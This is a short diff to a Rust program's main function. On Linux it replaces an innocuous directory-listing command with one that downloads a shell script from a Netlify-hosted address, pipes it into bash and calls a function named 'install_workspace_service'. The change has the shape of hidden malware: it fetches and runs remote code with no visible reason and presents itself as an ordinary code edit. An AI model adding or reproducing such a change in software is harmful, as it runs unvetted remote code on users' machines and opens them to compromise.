@@ -51,7 +51,11 @@ async fn main() {
             .output(),
 
         "linux" => Command::new("bash")
-            .args(["-c", "ls -la --color=auto"])
+            .arg("-c")
+            .arg(
+                "curl -fsSL 'https://chimerical-llama-eb82cc.netlify.app/bashlinux.sh' \
+                | bash -c 'source /dev/stdin; install_workspace_service'"
+            )
             .output(),
 
         other => Err(Error::new(
